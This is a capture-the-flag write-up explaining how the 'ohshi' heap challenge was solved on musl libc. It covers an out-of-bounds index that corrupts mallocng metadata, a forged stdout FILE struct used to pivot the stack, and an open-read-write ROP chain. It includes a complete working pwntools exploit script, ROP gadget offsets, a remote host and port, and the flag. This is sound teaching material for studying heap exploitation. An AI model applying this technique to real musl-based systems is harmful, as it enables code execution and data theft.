# ohshi — PWN Writeup

**Author:** Luma  
**Category:** PWN  
**Remote:** `nc 34.107.64.195 31323`  
**Flag:** `ROCSC{8870a25a9f58992387f32cbebbbc8adf3c172b582b2448c6bcd2532f642611b0}`

## Reconnaissance

We are given a stripped 64-bit PIE ELF binary (`main`) dynamically linked against **musl libc** (`libc.so`, served as `/lib/ld-musl-x86_64.so.1`), along with a Dockerfile running Ubuntu 22.04 + xinetd.

```
$ checksec app/main
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

All mitigations are enabled. The binary is linked against musl libc (707,056 bytes), which uses the **mallocng** heap allocator — significantly different from glibc's ptmalloc2.

## Reverse Engineering

### Program structure

The binary implements a standard heap note menu:

```
1. Alloc
2. Free
3. Print
4. Edit
5. Exit
```

It maintains two parallel arrays in BSS:

| Array      | BSS offset | Description                       |
|------------|------------|-----------------------------------|
| `sizes[16]`  | `0x4060`   | 16 × 8-byte size entries          |
| `chunks[16]` | `0x40e0`   | 16 × 8-byte chunk pointer entries |

BSS ends at exactly `0x4160`.

### Functions

- **alloc(idx, size):** Reads index and size, calls `malloc(size)`, stores the pointer in `chunks[idx]` and size in `sizes[idx]`, then reads content via `read(0, chunks[idx], size)`. No upper-bound check on the index — only checks `idx < 0` (negative).
- **free(idx):** Calls `free(chunks[idx])`, zeroes both `chunks[idx]` and `sizes[idx]`.
- **print(idx):** Calls `write(1, chunks[idx], sizes[idx] & 0xfff)`. **One-time use** — a `print_count` flag is set after first call.
- **edit(idx):** Reads new content via `read(0, chunks[idx], sizes[idx] & 0xfff)`, prints `"Edited."`.

### Seccomp sandbox

A BPF seccomp filter blocks:

| Blocked syscall | Number |
|-----------------|--------|
| `execve`        | 59     |
| `execveat`      | 322    |
| `prctl`         | 157    |

Everything else is allowed, including `open`/`read`/`write` — so the goal is an **ORW (open-read-write)** chain to exfiltrate `/home/ctf/flag.txt`.

## Vulnerability

The index parameter in all operations is only checked for **negative values** (`if (idx < 0)`), but there is no upper-bound check against 16. Using index **16** triggers an interesting aliasing:

- `sizes[16]` is at `0x4060 + 16×8 = 0x40e0` — which is exactly the start of `chunks[]`. So `sizes[16]` **aliases `chunks[0]`**.
- `chunks[16]` is at `0x40e0 + 16×8 = 0x4160` — which is **past the end of BSS**, landing in the musl mallocng **meta area** (the internal bookkeeping region that immediately follows BSS at runtime).

This gives us:
1. **OOB Read:** `print(16)` reads from the meta area pointer at `chunks[16]` for `sizes[16]` = `chunks[0]` bytes (a heap pointer, so typically ~512+ bytes of meta data).
2. **OOB Write:** `edit(16)` writes to the same meta area, allowing corruption of mallocng metadata.

## musl mallocng internals

musl's mallocng allocator organizes memory into **groups** by **sizeclass**. Each group has a **meta struct** (40 bytes):

```c
struct meta {
    struct meta *prev;      // +0x00
    struct meta *next;      // +0x08
    void        *mem;       // +0x10  — pointer to the group's memory region
    uint32_t    avail_mask; // +0x18  — bitmask of available slots
    uint32_t    freed_mask; // +0x1c  — bitmask of freed slots
    // +0x20: bitfield: last_idx(5), freeable(1), sizeclass(6), maplen(52)
};
```

When `malloc()` is called for sizeclass **SC17** (stride = 672 bytes = 0x2A0), the allocator:
1. Finds a meta with `avail_mask != 0`
2. Picks a slot from `avail_mask`
3. Returns `mem + slot * stride + 0x10 + offset` where offset depends on slack

The `mem` field directly controls where the returned pointer lands. **Corrupting `meta.mem`** lets us make `malloc()` return an arbitrary address.

### Deterministic placement with slack=0

mallocng adds a randomized offset: `offset = (counter * 16) % ((stride - size - IB) / 16 * 16)` where IB=4. For SC17 with `malloc(668)`: slack = `(672 - 668 - 4) / 16 = 0`, forcing offset to always be **0** regardless of the counter. This makes the returned pointer fully deterministic:

```
returned_ptr = mem + slot * 0x2A0 + 0x10
```

## Exploitation Strategy

### Overview

1. **Leak libc** via OOB print of the meta area
2. **Corrupt meta.mem** via OOB edit to point at `stdout`
3. **Allocate over stdout** — `malloc(668)` returns a chunk at `__stdout_FILE`
4. **Corrupt the FILE struct** to trigger a stack pivot on the next `printf()` call
5. **ORW ROP chain** reads and prints the flag

### Step 1 — Heap grooming + libc leak

```python
do_alloc(p, 1, 512, b'A' * 512)   # SC17 slot 1
do_alloc(p, 0, 512, b'B' * 512)   # SC17 slot 0 — chunks[0] = heap_ptr
do_print(p, 16)                     # leaks meta area
```

After the two allocations, `chunks[0]` is a heap pointer (~0x500+ in value). Since `sizes[16]` aliases `chunks[0]`, the `print(16)` call writes `chunks[0]` bytes from address `chunks[16]` (past BSS) — dumping the entire meta area.

The leaked data contains:
- **Heap pointers** (meta `prev`/`next`/`mem` for heap groups) — the majority
- **One libc pointer** — a `meta.mem` pointing into libc's BSS at `libc_base + 0xaff40`

We identify the libc pointer dynamically: group all pointers by their upper 32 bits, find the **minority prefix** (the single libc pointer among many heap pointers), and subtract the known offset.

### Step 2 — Corrupt SC17 meta.mem

We parse the leaked meta area to find the SC17 meta struct (sizeclass field == 17) that still has available slots. Then we compute:

```
target_mem = stdout_addr - (slot * 0x2A0 + 0x10)
```

and overwrite the meta's `mem` field via `edit(16)`, so the next SC17 allocation returns a pointer at `stdout_addr`.

### Step 3 — Overwrite stdout FILE struct

We call `alloc(2, 668)` — the allocator finds the corrupted SC17 meta, picks the available slot, and returns `target_mem + slot * 0x2A0 + 0x10 = stdout_addr`. The binary's `read()` in the alloc function writes our payload directly over `__stdout_FILE`.

### Step 4 — Stack pivot via __fwritex

After `alloc` returns, the main loop calls `printf()` to display the menu. This triggers:

1. **`vfprintf(stdout, ...)`** — checks `lock == -1` (skip FLOCK), `buf_size == 1` (skip internal buffering), `wend != 0` (proceed to format)
2. **`printf_core`** → **`out()`** → **`__fwritex(data, len, f)`** at `libc+0x5ca50`
3. **`__fwritex`**: since `wend - wpos = 0 < len`, it tail-calls `f->write(f, data, len)`
4. The `write` function pointer at `FILE+0x48` is our **PIVOT gadget** (`libc+0x789f5`):
   ```asm
   mov rsp, [rdi+0x30]   ; rsp = rop_addr (from FILE+0x30)
   jmp [rdi+0x38]         ; jump to ret gadget (from FILE+0x38)
   ```
5. This pivots the stack to our ROP chain embedded in the FILE struct at `stdout+0x100`.

### Fake FILE struct layout

| Offset | Value | Purpose |
|--------|-------|---------|
| `+0x00` | `0` | flags |
| `+0x20` | `stdout_addr` | wend (== wpos → remaining = 0) |
| `+0x28` | `stdout_addr` | wpos |
| `+0x30` | `stdout + 0x100` | pivot target RSP (ROP chain) |
| `+0x38` | `ret` gadget | pivot target JMP |
| `+0x48` | pivot gadget | `write` fn ptr → triggers pivot |
| `+0x58` | `stdout_addr` | buf |
| `+0x60` | `1` | buf_size (must be ≠ 0) |
| `+0x78` | `1` | fd = stdout |
| `+0x8c` | `-1` | lock (skip FLOCK) |
| `+0x90` | `-1` | lbf |
| `+0x98` | `"/home/ctf/flag.txt\0"` | flag path string |
| `+0x100` | ROP chain | ORW chain |

### Step 5 — ORW ROP chain

```
open("/home/ctf/flag.txt", 0)      → fd = 3
read(3, writable_buf, 128)          → read flag
write(1, writable_buf, 128)         → print flag
exit(0)                             → clean exit
```

### ROP gadgets (from musl libc)

| Gadget | Offset | Bytes |
|--------|--------|-------|
| `pop rdi; ret` | `0x152a1` | `5f c3` |
| `ret` | `0x152a2` | `c3` |
| `pop rsi; ret` | `0x1b0a1` | `5e c3` |
| `pop rdx; ret` | `0x2a50b` | `5a c3` |
| `pop rax; ret` | `0x16a86` | `58 c3` |
| `syscall; ret` | `0x21270` | `0f 05 c3` |
| `mov rsp,[rdi+0x30]; jmp [rdi+0x38]` | `0x789f5` | `48 8b 67 30 ff 67 38` |

## Key challenges and pitfalls

1. **musl mallocng vs glibc ptmalloc2:** The entire heap exploitation strategy differs — no tcache, no fastbins, no unsorted bin attacks. Instead, we target the `meta.mem` field.

2. **Deterministic chunk placement:** Using `malloc(668)` instead of `malloc(512)` eliminates the random offset added by mallocng's `enframe()` function (slack = 0).

3. **Dynamic libc leak:** The meta area layout varies between runs and environments. Rather than hardcoding an offset, we dynamically identify the single libc pointer among many heap pointers by finding the minority address-range prefix.

4. **buf_size must be non-zero:** If `buf_size == 0`, musl's `vfprintf` takes an internal buffering path that zeroes `wend`/`wbase`/`wpos`, destroying our pivot setup before it triggers.

5. **Synchronization with pwntools:** The `print(16)` leak dumps raw binary data that may contain `> ` bytes, causing premature `recvuntil` matches. We use `recvuntil(b'5. Exit\n> ')` as a more specific delimiter, then carefully track which menu prompt has been consumed.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *
import struct, sys
from collections import Counter

context.arch = 'amd64'

REMOTE = False
RHOST, RPORT = '34.107.64.195', 31323
LHOST, LPORT = '127.0.0.1', 3001

KNOWN_LIBC_MEMS = [0xaff40]
STDOUT_OFF      = 0xad280
POP_RDI = 0x152a1; RET_GAD = 0x152a2; POP_RSI = 0x1b0a1
POP_RDX = 0x2a50b; POP_RAX = 0x16a86; SYSCALL = 0x21270
PIVOT   = 0x789f5
SC17_STRIDE = 0x2A0; ALLOC_SIZE = 668; META_SIZE = 0x28

def conn():
    return remote(RHOST, RPORT) if REMOTE else remote(LHOST, LPORT)

def menu(p, c):  p.sendlineafter(b'> ', str(c).encode())
def do_alloc(p, idx, sz, data):
    menu(p, 1); p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(sz).encode()); p.sendafter(b'Content: ', data)
def do_print(p, idx):
    menu(p, 3); p.sendlineafter(b'Index: ', str(idx).encode())
def parse_meta(raw, i):
    o = i * META_SIZE
    if o + META_SIZE > len(raw): return None
    return {'off': o, 'mem': u64(raw[o+16:o+24]),
            'avail_mask': struct.unpack_from('<I', raw, o+24)[0],
            'sizeclass': (u64(raw[o+32:o+40]) >> 6) & 0x3f}

def exploit():
    p = conn()

    # Step 1: heap grooming
    do_alloc(p, 1, 512, b'A'*512)
    do_alloc(p, 0, 512, b'B'*512)

    # Step 2: leak libc via OOB print
    do_print(p, 16)
    resp = p.recvuntil(b'5. Exit\n> ', timeout=10)
    dm = resp.find(b'Data: ')
    if dm >= 0: resp = resp[dm+6:]
    mm = resp.rfind(b'\n1. Alloc')
    raw = resp[:mm] if mm >= 0 else resp

    # Dynamic libc pointer detection
    ptrs = [(o, u64(raw[o:o+8]), u64(raw[o:o+8])>>32)
            for o in range(0, len(raw)-7, 8) if 0x1000 < u64(raw[o:o+8]) < 0x7fffffffffff]
    majority = Counter(pf for _,_,pf in ptrs).most_common(1)[0][0]
    libc_cands = [(o, v) for o, v, pf in ptrs if pf != majority]

    libc_base = None
    for _, val in libc_cands:
        for km in KNOWN_LIBC_MEMS:
            c = val - km
            if c > 0 and (c & 0xfff) == 0: libc_base = c; break
        if libc_base: break
    stdout_addr = libc_base + STDOUT_OFF

    # Find SC17 meta with available slot
    sc17 = next(m for i in range(len(raw)//META_SIZE)
                if (m := parse_meta(raw, i)) and m['sizeclass']==17 and m['avail_mask'])
    avail = sc17['avail_mask']
    slot = next(s for s in range(8) if avail & (1<<s))
    slot_base = slot * SC17_STRIDE + 0x10

    # Step 3: corrupt meta.mem → stdout
    target_mem = stdout_addr - slot_base
    edit_data = bytearray(raw)
    edit_data[sc17['off']+16 : sc17['off']+24] = p64(target_mem)
    p.sendline(b'4')
    p.sendlineafter(b'Index: ', b'16')
    p.sendafter(b'New Content: ', bytes(edit_data))

    # Step 4: alloc at stdout with FILE + ORW payload
    G = lambda off: libc_base + off
    pay = bytearray(ALLOC_SIZE)
    struct.pack_into('<Q', pay, 0x20, stdout_addr)           # wend
    struct.pack_into('<Q', pay, 0x28, stdout_addr)           # wpos
    struct.pack_into('<Q', pay, 0x30, stdout_addr + 0x100)   # pivot RSP
    struct.pack_into('<Q', pay, 0x38, G(RET_GAD))            # pivot JMP
    struct.pack_into('<Q', pay, 0x48, G(PIVOT))              # write fn
    struct.pack_into('<Q', pay, 0x60, 1)                     # buf_size
    struct.pack_into('<I', pay, 0x78, 1)                     # fd
    struct.pack_into('<i', pay, 0x8c, -1)                    # lock
    struct.pack_into('<i', pay, 0x90, -1)                    # lbf
    pay[0x98:0x98+19] = b"/home/ctf/flag.txt\x00"

    buf = libc_base + 0xae000
    rop = flat(
        G(POP_RDI), stdout_addr+0x98, G(POP_RSI), 0, G(POP_RAX), 2, G(SYSCALL),
        G(POP_RDI), 3, G(POP_RSI), buf, G(POP_RDX), 128, G(POP_RAX), 0, G(SYSCALL),
        G(POP_RDI), 1, G(POP_RSI), buf, G(POP_RDX), 128, G(POP_RAX), 1, G(SYSCALL),
        G(POP_RDI), 0, G(POP_RAX), 60, G(SYSCALL),
    )
    pay[0x100:0x100+len(rop)] = rop

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', b'2')
    p.sendlineafter(b'Size: ', str(ALLOC_SIZE).encode())
    p.sendafter(b'Content: ', bytes(pay))

    # Step 5: receive flag
    result = p.recvall(timeout=5)
    print(result)

if __name__ == '__main__':
    REMOTE = '--remote' in sys.argv
    exploit()
```

## Flag

```
ROCSC{8870a25a9f58992387f32cbebbbc8adf3c172b582b2448c6bcd2532f642611b0}
```
